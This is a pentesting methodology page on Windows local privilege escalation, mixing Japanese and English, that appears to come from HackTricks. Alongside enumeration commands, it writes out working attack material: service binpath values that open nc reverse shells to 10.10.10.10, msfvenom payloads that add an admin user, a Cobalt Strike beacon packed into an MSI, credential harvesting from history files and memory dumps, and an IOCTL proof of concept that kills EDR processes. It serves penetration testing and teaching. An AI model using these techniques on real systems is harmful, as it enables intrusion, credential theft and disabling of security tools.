# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors を探すためのベストツール：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## 初歩的な Windows 理論

### Access Tokens

**Windows Access Tokens を知らない場合は、続行する前に次のページを読んでください：**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs に関する詳細は次のページを確認してください：**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の integrity levels を知らない場合は、続行する前に次のページを読んでください：**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows のセキュリティコントロール

Windows には、**prevent you from enumerating the system**、実行ファイルの実行を妨げたり、さらには**detect your activities**するなど、さまざまな要素があります。privilege escalation enumeration を開始する前に、次の**page**を**read**し、これらのすべての**defenses** **mechanisms**を**enumerate**してください：


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## システム情報

### Version info enumeration

Windows のバージョンに既知の脆弱性がないか確認してください（適用されているパッチも確認してください）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### バージョンエクスプロイト

This [site](https://msrc.microsoft.com/update-guide/vulnerability) は Microsoft のセキュリティ脆弱性に関する詳細情報の検索に便利です。このデータベースには 4,700 件以上のセキュリティ脆弱性が含まれており、Windows 環境が持つ **膨大な攻撃対象範囲** を示しています。

**システム上**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas は watson を組み込んでいる)_

**システム情報を使ったローカル**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

資格情報や Juicy な情報が env 変数に保存されているか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell の履歴
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell トランスクリプトファイル

これを有効にする方法は [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) で学べます。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell パイプラインの実行に関する詳細が記録されます。実行されたコマンド、コマンドの呼び出し、スクリプトの一部などが含まれますが、実行の完全な詳細や出力結果がすべて記録されるとは限りません。

これを有効にするには、ドキュメントの "Transcript files" セクションの手順に従い、**"Module Logging"** を選択し、**"Powershell Transcription"** の代わりに使用してください。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShellログの最新15件のイベントを表示するには、次を実行します:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

スクリプトの実行に関する完全な活動および実行内容の全文が記録され、各コードブロックが実行時に文書化されることが保証されます。このプロセスは各操作の包括的な監査証跡を保存し、フォレンジックや悪意ある挙動の分析に有用です。実行時にすべての活動を記録することで、プロセスに関する詳細な洞察が得られます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block のログイベントは Windows Event Viewer のパス（**Application and Services Logs > Microsoft > Windows > PowerShell > Operational**）にあります。\
最後の20件のイベントを表示するには次を使用できます:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### インターネット設定
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

更新が http**S** ではなく http で要求されている場合、システムを侵害できます。

まず、ネットワークが非SSLの WSUS アップデートを使用しているかを確認するため、cmd で次のコマンドを実行します:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または、PowerShellで次のように実行します:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
次のような返信を受け取った場合:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
そして、もし `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` が `1` と等しい場合。

その場合、**悪用可能です。** 最後のレジストリが 0 に等しい場合、WSUS エントリは無視されます。

この脆弱性を悪用するには、次のようなツールを使用できます: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - これらは MiTM による悪用用スクリプトで、非 SSL の WSUS トラフィックに '偽の' 更新を注入します。

調査はここを参照してください：

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
基本的に、この脆弱性が悪用する欠陥は次の通りです：

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

この脆弱性はツール [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) を使って悪用できます（公開され次第）。

## Third-Party Auto-Updaters and Agent IPC (local privesc)

多くの enterprise agents は localhost の IPC サーフェスと特権付きの更新チャネルを公開しています。もし enrollment が攻撃者のサーバーへ強制され、updater が rogue root CA を信頼するか弱い署名チェックしか行われない場合、ローカルユーザーは SYSTEM サービスがインストールする悪意ある MSI を配信できます。一般化された手法（Netskope stAgentSvc チェーンに基づく – CVE-2025-0309）はこちら：

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. It is important to note that these **requirements** are met using **default settings**.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

power-up の `Write-UserAddMSI` コマンドを使い、カレントディレクトリに権限昇格用の Windows MSI バイナリを作成します。このスクリプトは事前にコンパイルされた MSI インストーラーを出力し、ユーザー/グループ追加のプロンプトを表示します（そのため GIU アクセスが必要になります）：
```
Write-UserAddMSI
```
作成したバイナリを実行するだけで権限昇格できます。

### MSI Wrapper

このチュートリアルを読んで、MSI wrapper を作成する方法を学んでください。コマンドラインを実行したいだけなら、"**.bat**" ファイルをラップできます。


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual StudioでMSIを作成する

- Cobalt Strike または Metasploit を使って `C:\privesc\beacon.exe` に **new Windows EXE TCP payload** を **Generate** します
- **Visual Studio** を開き、**Create a new project** を選択して検索ボックスに "installer" と入力します。**Setup Wizard** プロジェクトを選択して **Next** をクリックします。
- プロジェクト名を **AlwaysPrivesc** のように付け、ロケーションに **`C:\privesc`** を使用し、**place solution and project in the same directory** を選択して **Create** をクリックします。
- 4段階中のステップ3（含めるファイルを選択）に到達するまで **Next** をクリックし続けます。**Add** をクリックして先ほど生成した Beacon ペイロードを選択し、**Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトを選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
- Author や Manufacturer のような他のプロパティも変更できます。これらはインストールされたアプリをより正当性があるように見せるのに使えます。
- プロジェクトを右クリックして **View > Custom Actions** を選択します。
- **Install** を右クリックし **Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** を選択して **OK** をクリックします。これによりインストーラー実行時に Beacon ペイロードがすぐに実行されます。
- **Custom Action Properties** の下で **Run64Bit** を **True** に変更します。
- 最後にビルドします。
- 警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` が表示された場合は、プラットフォームを x64 に設定していることを確認してください。

### MSI インストール

悪意のある `.msi` ファイルのインストールをバックグラウンドで実行するには：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を利用するには次を使用できます: _exploit/windows/local/always_install_elevated_

## アンチウイルスと検出

### 監査設定

これらの設定は何が**ログに記録されるか**を決定するので、注意が必要です。
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding は、ログの送信先を把握しておくことが重要です
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** はドメインに参加しているコンピュータ上の **local Administrator passwords** の管理を目的としており、各パスワードが **一意でランダム化され、定期的に更新される** ようにします。これらのパスワードは Active Directory 内に安全に保存され、ACLs を通じて十分な権限が付与されたユーザーのみがアクセスでき、許可されている場合に local admin passwords を閲覧できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) に対する保護を強化し、信頼されていないプロセスがそのメモリを**読み取る**、あるいはコードを注入する試みを**ブロック**してシステムをさらに保護しています。\  
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。これは、デバイスに保存された資格情報を pass-the-hash 攻撃のような脅威から保護することを目的としています。| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** は **Local Security Authority** (LSA) によって認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオンデータが登録されたセキュリティパッケージによって認証されると、通常そのユーザーの domain credentials が確立されます。\
[**Cached Credentials に関する詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザーとグループ

### ユーザーとグループを列挙する

自分が所属するグループのいずれかに、興味深い権限がないか確認してください。
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特権グループ

もしあなたが特定の特権グループに属している場合、権限昇格（escalate privileges）できる可能性があります。特権グループとそれを悪用して権限を昇格させる方法については、こちらを参照してください：


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**詳しくは** このページで **token** が何かを確認してください: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
興味深い **token** とそれらを悪用する方法については、以下のページを確認してください：


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログオン済みユーザー / セッション
```bash
qwinsta
klist sessions
```
### ホームフォルダ
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダの権限

まず、プロセスを一覧表示して、**プロセスのコマンドライン内にパスワードが含まれていないかを確認**します。\
実行中のバイナリを**上書きできるか**、あるいはバイナリフォルダに書き込み権限があるかを確認して、可能な[**DLL Hijacking attacks**](dll-hijacking/index.html)を悪用できるか調べます:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に[**electron/cef/chromium debuggers** が実行されていないか確認してください — you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**プロセスのバイナリの権限を確認する**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスの binaries が格納されているフォルダの権限を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

実行中のプロセスのメモリダンプは、sysinternalsの**procdump**を使って作成できます。FTPのようなサービスでは**credentials in clear text in memory**が存在することがあるため、メモリをダンプしてcredentialsを読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 安全性の低い GUI アプリ

**SYSTEM として実行されているアプリケーションは、ユーザーが CMD を起動したり、ディレクトリを閲覧できるようにする可能性があります。**

例: "Windows Help and Support" (Windows + F1) で "command prompt" を検索し、"Click to open Command Prompt" をクリック

## サービス

Service Triggers により、特定の条件が発生したときに Windows がサービスを起動できます（named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.）。SERVICE_START 権限がなくても、トリガーを作動させることで特権サービスを起動できることがよくあります。列挙および有効化の手法については以下を参照してください：

-
{{#ref}}
service-triggers.md
{{#endref}}

サービスの一覧を取得する：
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

サービスの情報を取得するために**sc**を使用できます。
```bash
sc qc <service_name>
```
各サービスの必要な権限レベルを確認するために、_Sysinternals_ のバイナリ **accesschk** を用意しておくことを推奨します。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
「Authenticated Users」が任意のサービスを変更できるか確認することを推奨します：
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスの有効化

次のようなエラーが発生している場合（例えば SSDPSRV）:

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

次のコマンドを使用して有効化できます
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**サービス upnphost は動作するために SSDPSRV に依存していることを考慮してください（XP SP1 用）**

**別の回避策**は次を実行することです:
```
sc.exe config usosvc start= auto
```
### **サービスのバイナリパスを変更する**

サービスに対して "Authenticated users" グループが **SERVICE_ALL_ACCESS** を持っている場合、サービスの実行可能バイナリを変更することが可能です。バイナリを変更して **sc** を実行するには:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスの再起動
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
権限は以下のような各種の許可を介して昇格できます:

- **SERVICE_CHANGE_CONFIG**: サービスのバイナリの再構成を許可します。
- **WRITE_DAC**: アクセス権の再設定を可能にし、その結果サービス構成を変更できるようになります。
- **WRITE_OWNER**: 所有権の取得とアクセス権の再設定を許可します。
- **GENERIC_WRITE**: サービス構成を変更する権限を含みます。
- **GENERIC_ALL**: 同様にサービス構成を変更する権限を含みます。

この脆弱性の検出および悪用には、_exploit/windows/local/service_permissions_ を使用できます。

### サービスバイナリの弱い権限

**サービスによって実行されるバイナリを変更できるか確認してください** または、バイナリが配置されているフォルダに対して**書き込み権限があるか**を確認してください ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
サービスによって実行されるすべてのバイナリは **wmic** を使って取得でき（system32内ではない）、権限は **icacls** で確認できます:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
また **sc** と **icacls** を使用できます:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### サービスレジストリの変更権限

任意のサービスレジストリを変更できるか確認してください。\  
次のようにサービス**レジストリ**に対する**権限**を**確認**できます:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているかを確認する必要があります。もしそうであれば、サービスによって実行されるバイナリを変更できます。

実行されるバイナリのパスを変更するには:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry の AppendData/AddSubdirectory 権限

レジストリに対してこの権限を持っている場合、これは**このレジストリからサブレジストリを作成できる**ことを意味します。Windows services の場合、これは**任意のコードを実行するのに十分です：**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルへのパスが引用符で囲まれていない場合、Windows はスペースの前ごとに末尾を順に実行しようとします。

例えば、パス _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次の順で実行を試みます：
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込みの Windows サービスに属するものを除き、引用符で囲まれていないサービスのパスをすべて列挙する:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**検出および悪用できます** この脆弱性は metasploit で: `exploit/windows/local/trusted\_service\_path` metasploitを使用して手動で service binary を作成できます:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 回復アクション

Windows はサービスが失敗した場合に実行されるアクションをユーザーが指定できる。この機能は binary を指すように設定できる。もしこの binary を置き換え可能であれば、privilege escalation が可能になる場合がある。詳細は [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) を参照してください。

## アプリケーション

### インストール済みアプリケーション

確認する: **permissions of the binaries**（上書きできればprivilege escalationが可能かもしれない）および**folders**を確認する（[DLL Hijacking](dll-hijacking/index.html)）。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

特定のファイルを読むために設定ファイルを変更できるか、あるいは管理者アカウント（schedtasks）で実行されるバイナリを変更できるか確認する。

システムで弱いフォルダ/ファイルの権限を見つける方法は次のとおり:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### スタートアップで実行

**別のユーザーによって実行される registry や binary を上書きできるか確認してください。**\
**読んでください** 次の **以下のページ** を参照し、興味深い **autoruns locations to escalate privileges** について詳しく学んでください:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ドライバー

可能性のある **サードパーティの怪しい/脆弱な** ドライバーを探す
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. Learn the full chain here:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Some signed third‑party drivers create their device object with a strong SDDL via IoCreateDeviceSecure but forget to set FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Without this flag, the secure DACL is not enforced when the device is opened through a path containing an extra component, letting any unprivileged user obtain a handle by using a namespace path like:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Once a user can open the device, privileged IOCTLs exposed by the driver can be abused for LPE and tampering. Example capabilities observed in the wild:
- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- 開発者向けの対策: 常に FILE_DEVICE_SECURE_OPEN を設定してください（DACL で制限することを意図した device objects を作成する際）。
- 特権操作に対して呼び出し元のコンテキストを検証する。プロセス終了やハンドルの返却を許可する前に PP/PPL チェックを追加する。
